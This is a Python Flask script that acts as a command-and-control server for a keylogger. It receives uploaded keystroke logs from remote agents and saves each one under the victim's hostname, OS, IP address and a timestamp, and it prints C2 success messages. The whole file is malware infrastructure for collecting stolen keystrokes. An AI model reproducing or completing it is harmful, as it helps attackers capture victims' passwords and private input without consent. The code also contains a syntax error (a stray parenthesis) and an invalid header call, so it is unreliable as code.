import os
import base64
import sys
from datetime import datetime
from flask import Flask, flash,request, redirect, url_for
from werkzeug.utils import secure_filename

KLOG_UPLOAD_DIR = "" ##Keylogger File Dir goes here

klog_server = Flask(__name__)
klog_server.config['KLOG_UPLOAD_DIR'] = KLOG_UPLOAD_DIR
##klog_server.run(ssl_context=(<name of cert>, <name of pem>))  This line should enable HTTPS for the server

@klog_server.route('/klog_endpoint',methods=['GET','POST']) ##This is a place holder endpoint name; HEAD Method needed
def klog_collect():
	if request.method == 'POST':
		klog_file =  request.files["bbe02f946d5455d74616fc9777557c22"]
		getid_headers = base64.b64decode(request.headers.get('Nn')) + b'_' + base64.b64decode(request.headers.getitem('Sn'))
		##Filename format is as follows <hostname>_<OS>_<remote_addr>_<timestamp>
		##hostname/OS are both from the agents http headers
		##Remote Addr is logged from what flask recives from the request obj
		##Timestamp is YY-MM-DDThh:mm:ss:
		filename = getid_headers + b'_'+ bytes(request.remote_addr, encoding='utf-8') + b'_' +bytes(datetime.now().isoformat(timespec='seconds'), encoding='utf-8')
		out = klog_file.save(KLOG_UPLOAD_DIR + filename.decode('utf-8'))
		if(out == None):
			sys.stdout.write("\n[*]C2 Request Successful!\n"))
			return "[*]C2 Request Successful!"
		elif(out !=  None):
			sys.stdout.write("\n[*]C2 Request Error! Traceback to follow\n")
			print(sys.exc_info()[2]) ##Contains Error info for running process
			return "[*]C2 Request Error!"
